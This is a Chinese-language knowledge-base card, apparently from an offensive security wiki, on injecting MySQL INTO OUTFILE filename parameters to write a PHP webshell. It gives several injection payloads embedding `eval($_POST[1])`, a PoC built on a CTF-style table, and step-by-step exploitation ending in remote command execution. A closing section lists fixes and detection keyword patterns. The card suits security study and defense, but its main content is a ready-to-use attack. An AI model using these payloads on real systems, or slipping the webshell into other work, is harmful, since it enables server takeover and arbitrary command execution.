---
id: web-generic-sqli-mysql-outfile-filename-clause-injection
title: MySQL INTO OUTFILE 文件名可控：LINES/FIELDS TERMINATED BY 注入写 Webshell
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-outfile-filename-clause-injection
tags:
- sqli
- mysql
- into-outfile
- webshell
- file-write
- lines-terminated-by
- fields-terminated-by
- filename-injection
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:06:03+08:00'
  notes: 已对照原文核对：INTO OUTFILE '/var/www/html/dump/{}'拼接、lines terminated/starting by与fields terminated by三类payload与原文一致；卡中说明结果集非空、FILE权限、secure_file_priv等前提合理；原文无版本标记，未设置versions；PoC未复现
url: /docs/web/generic/sqli/web-generic-sqli-mysql-outfile-filename-clause-injection/
draft: false
kb_aliases:
- INTO OUTFILE 文件名注入
- lines terminated by 写马
- fields terminated by 注入
- MySQL 导出文件名注入
- OUTFILE 子句注入
---

## 一句话结论

当应用把用户可控的文件名拼进 `SELECT ... INTO OUTFILE '/path/{$filename}'` 时，攻击者可以在文件名参数中闭合引号，追加 `LINES TERMINATED BY`、`LINES STARTING BY` 或 `FIELDS TERMINATED BY` 子句，把一句话木马作为行分隔符/字段分隔符写入目标 `.php` 文件；服务端只要执行该导出查询且结果集非空，WebShell 代码就会随数据行一起落盘。

## 原理

- **OUTFILE 的可控子句**：MySQL 的 `SELECT ... INTO OUTFILE 'file'` 支持可选的 `FIELDS TERMINATED BY`、`FIELDS ENCLOSED BY`、`FIELDS ESCAPED BY`、`LINES STARTING BY`、`LINES TERMINATED BY`。这些子句用于格式化导出文本。
- **文件名拼接注入**：若代码写成 `$sql = "select * from ... into outfile '/var/www/html/dump/{$filename}';"`，且 `$filename` 未做转义/白名单，攻击者可以提交：
  - `1.php' lines terminated by '<?php eval($_POST[1]);?>'#`
  - `1.php' lines starting by '<?php eval($_POST[1]);?>'#`
  - `1.php' fields terminated by '<?php eval($_POST[1]);?>'#`
  闭合原引号后，`#` 注释掉剩余部分，形成语法合法的导出语句。
- **为什么能写成 WebShell**：导出时 MySQL 会把结果集的每一行/每个字段按指定分隔符写出。把 PHP 代码作为 `LINES TERMINATED BY`，每行数据后都会追加该代码；作为 `LINES STARTING BY`，每行前追加；作为 `FIELDS TERMINATED BY`，字段之间追加。浏览器/Web 服务器解析 `.php` 文件时，会执行其中的 `<?php ... ?>` 片段，前面的数据内容不影响。
- **与 UNION 写马的区别**：常规 `UNION SELECT ... INTO OUTFILE` 需要控制列数并把 shell 作为某一列；本手法不需要列数匹配，只要文件名可注入且原查询有结果行，就能把 shell 写入导出文件，适合“应用自己构造导出语句”的场景。
- **前提**：数据库账号有 `FILE` 权限、`secure_file_priv` 允许目标目录、导出目录可写且位于 Web 根下、Web 服务器解析 `.php`。

## 触发条件

- 应用存在把用户输入拼进 `INTO OUTFILE` 文件名的导出/备份功能。
- 文件名参数未做引号转义或路径白名单，允许注入 `'`、空格、关键字和 `#`。
- 数据库账号具备 `FILE` 权限，`secure_file_priv` 为空或包含目标目录。
- 目标目录位于 Web 根下且 mysqld 可写；Web 服务器解析 `.php`。
- 原查询能返回至少一行结果（否则不会写出分隔符/数据）。
- WAF 未拦截 `INTO OUTFILE`、`LINES TERMINATED BY` 等关键字。

## 利用步骤

1. 找到导出接口，确认文件名参数被拼进 `INTO OUTFILE`（报错、下载文件名、响应差异）。
2. 用正常文件名导出，确认文件落盘路径与 Web 可访问性。
3. 构造 payload：`1.php' lines terminated by '<?php eval($_POST[1]);?>'#`，提交导出请求。
4. 访问 `/dump/1.php`，用 POST 参数 `1=system('id');` 验证执行。
5. 若 `LINES TERMINATED BY` 被过滤，改用 `LINES STARTING BY`、`FIELDS TERMINATED BY`，或调整注释符（`-- `、`#`）与大小写。
6. 清理导出文件与临时数据。

## PoC

假设后端查询：

```sql
SELECT * FROM ctfshow_user INTO OUTFILE '/var/www/html/dump/{$filename}';
```

恶意文件名与生成的 SQL：

```text
filename=1.php' lines terminated by '<?php eval($_POST[1]);?>'#
```

```sql
SELECT * FROM ctfshow_user INTO OUTFILE '/var/www/html/dump/1.php'
LINES TERMINATED BY '<?php eval($_POST[1]);?>'#
```

变体：

```text
filename=1.php' lines starting by '<?php eval($_POST[1]);?>'#
filename=1.php' fields terminated by '<?php eval($_POST[1]);?>'#
```

访问 `http://target/dump/1.php`，POST `1=system('id');` 执行命令。

## 变体与关联

- 变体（子句）：`LINES TERMINATED BY`、`LINES STARTING BY`、`FIELDS TERMINATED BY`、`FIELDS ENCLOSED BY`；不同子句插入位置不同，按过滤情况选择。
- 变体（注释）：`#`、`-- `、`/* */`；需保证注释掉原查询末尾的引号/分号。
- 变体（文件后缀）：`.php`、`.phtml`、`.php5` 等，取决于 Web 服务器解析配置。
- 关联：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（UNION SELECT 写 OUTFILE / general_log 写马；本卡是文件名/子句注入的另一条写马路径）。
- 关联：[[web-generic-file-upload-user-controlled-filename-webshell]]（同为“用户可控文件名落到可解析脚本后缀”导致写马）。
- 边界：文件名使用参数化/白名单、`secure_file_priv` 限制目录、无 `FILE` 权限、查询结果为空、Web 不解析目标后缀时失效。

## 检测与防御

- 修复：导出文件名使用服务端生成的随机名，禁止用户控制路径/文件名；`INTO OUTFILE` 语句参数化/白名单化，转义单引号并拒绝 `LINES`/`FIELDS` 关键字。
- 权限：业务账号不授予 `FILE` 权限；`secure_file_priv` 设为专用目录或 `NULL`。
- 文件系统：导出目录与 Web 根分离，禁止数据库写入可解析脚本后缀；Web 目录禁止脚本写入。
- 检测：请求参数中出现 `into outfile`、`lines terminated by`、`lines starting by`、`fields terminated by`、`<?php`、`eval(`；SQL 日志中出现异常 OUTFILE 子句；Web 目录新增 `.php` 文件；导出接口返回后立即访问新文件。
- 运营：审计所有拼接 OUTFILE 路径的代码；对导出功能做路径与后缀白名单。
